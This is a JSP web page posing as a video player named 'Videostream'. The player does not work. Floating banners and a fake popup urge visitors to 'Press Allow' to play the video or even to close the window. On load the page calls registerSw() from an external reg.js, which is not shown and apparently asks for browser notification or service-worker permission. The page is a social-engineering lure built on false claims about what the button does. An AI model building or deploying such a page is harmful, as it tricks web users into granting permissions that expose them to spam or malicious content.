
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Videostream</title>
</head>



<body style="min-height: 100%;-webkit-font-smoothing: antialiased;margin: 0;padding: 0;color: #fff;font-family: verdana,helvetica,arial,sans-serif;" onload="registerSw()" onmouseleave="checkMouse(this)">


<script src="resources/reg.js"></script>

<style>
    @-webkit-keyframes float {
        0% {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
        50% {
            -webkit-transform: translate(-50%, -5px);
            transform: translate(-50%, -5px)
        }
        to {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
    }

    @keyframes float {
        0% {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
        50% {
            -webkit-transform: translate(-50%, -5px);
            transform: translate(-50%, -5px)
        }
        to {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
    }

    @-webkit-keyframes floatcenter {
        0% {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
        50% {
            -webkit-transform: translate(0, -5px);
            transform: translate(0, -5px)
        }
        to {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
    }

    @keyframes floatcenter {
        0% {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
        50% {
            -webkit-transform: translate(0, -5px);
            transform: translate(0, -5px)
        }
        to {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
    }

    @media (max-width: 420px) {
        .p1, .p2 {
            display: none !important;
        }

        .c4 {
            bottom: 2% !important;
            top: unset !important;

        }
    }

    @media (max-width: 680px) {
        .p1 {
            width: 64px !important;
            height: 64px !important;
        }
    }

    @media (max-width: 700px) {
        .c5 {
            width: 400px !important;
            left: calc(50% - 240px) !important;
        }
    }

    @media (max-width: 950px) {
        .c4 {
            /*top: 10px !important;*/
            left: calc(50% - 150px) !important;
            -webkit-animation: floatcenter 1s ease-in-out infinite !important;
            animation: floatcenter 1s ease-in-out infinite !important;
        }
    }
</style>


<div>
    <div style="display: -webkit-box;display: -ms-flexbox;display: flex;-webkit-box-align: center;-ms-flex-align: center;align-items: center;-webkit-box-pack: center;-ms-flex-pack: center;justify-content: center;max-width: 800px;height: 100vh;margin: 0 auto;vertical-align: middle">
        <div style="position: relative;width: 100%;padding-bottom: 75%;cursor: not-allowed">
            <div style="display: -webkit-box;display: -ms-flexbox;display: flex;position: absolute;top: 0;right: 0;bottom: 50px;left: 0;-webkit-box-align: center;-ms-flex-align: center;align-items: center;-webkit-box-pack: center;-ms-flex-pack: center;justify-content: center;background: #2d2d2d">
                <div style="display: none;width: 64px;height: 64px;margin: 0 auto;background-image: url(resources/img/loading.gif);background-size: 100% 100%"></div>
                <div style="text-align: center">
                    <div class="p1" style="width: 96px;height: 96px;margin: 0 auto 40px;background-image: url(resources/img/puzzle.jpeg);background-size: 100% 100%"></div>
                    <h1 style="margin-bottom: 5px">Press <strong style="color: #1394ff;text-transform: uppercase">Allow </strong> to play video</h1>
                    <h2 style="font-size: 18px;font-weight: 400">Stream and download are available</h2>
                </div>
            </div>
            <div style="position: absolute;right: 0;bottom: 0;left: 0;height: 50px;overflow: hidden;background: #000;line-height: 60px">
                <div style="position: absolute;top: 3px;right: 0;left: 0;height: 4px;background-color: #666">
                    <div style="width: 3px;height: 4px;background-color: #d0021b"></div>
                </div>
                <div style="float: left;text-align: left">
                    <div style="display: inline-block;width: 32px;height: 32px;margin: 0 5px;background-size: 100% 100%;vertical-align: middle; background-image: url(resources/img/play.svg);"></div>
                    <div class="p2" style="display: inline-block;width: 32px;height: 32px;margin: 0 5px;background-size: 100% 100%;vertical-align: middle; background-image: url(resources/img/next.svg);"></div>
                    <div style="display: inline-block;margin: 0 5px;font-size: 12px;vertical-align: middle">00:00 /
                        21:20
                    </div>
                    <div style="display: inline-block;width: 32px;height: 32px;margin: 0 5px;background-size: 100% 100%;vertical-align: middle; background-image: url(resources/img/volume.svg)"></div>
                </div>
                <div style="float: right;text-align: right">
                    <div style="display: inline-block;width: 32px;height: 32px;margin: 0 5px;background-size: 100% 100%;vertical-align: middle; background-image: url(resources/img/settings.svg)"></div>
                    <div style="display: inline-block;width: 32px;height: 32px;margin: 0 5px;background-size: 100% 100%;vertical-align: middle; background-image: url(resources/img/fullScr.svg)"></div>
                    <div style="display: inline-block;width: 32px;height: 32px;margin: 0 5px;background-size: 100% 100%;vertical-align: middle; background-image: url(resources/img/download.svg)"></div>
                </div>
            </div>
        </div>
    </div>
    <div id="popup" style="display: none; position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; background: rgba(0, 0, 0, 0.8); z-index: 99;">
        <div class="c5" style="z-index: 1;position: absolute;top: 0;right: 20px;left: calc(50% - 340px);max-width: 600px;padding: 40px;background: #fff;-webkit-box-shadow: 0 5px 10px rgba(0,0,0,.5);box-shadow: 0 5px 10px rgba(0,0,0,.5);color: #000;text-align: left;">
            <p style="font-weight: 700">Press "Allow" to close the window</p>
            <p style="font-size: 14px">You can close the window by pressing "Allow". If you want to continue just click "Detailed Information".</p>
            <p style="color: #009cff; font-size: 14px">Detailed Information</p>
        </div>
    </div>

    <div class="c4" style="font-size:20px;font-weight:700;text-align:center;text-transform:uppercase;-webkit-animation:float 1s ease-in-out infinite;animation: float 1s ease-in-out infinite;    z-index: 1;position: fixed;top: 120px;left: 390px;padding: 20px;-webkit-transform: translateX(-50%);transform: translateX(-50%);border-radius: 10px;background: #fff;-webkit-box-shadow: 0 5px 10px rgba(0,0,0,.5);box-shadow: 0 5px 10px rgba(0,0,0,.5);color: #000;">
        Press <span style="color: #197aec">Allow </span> to play
    </div>

</div>




</body>
</html>
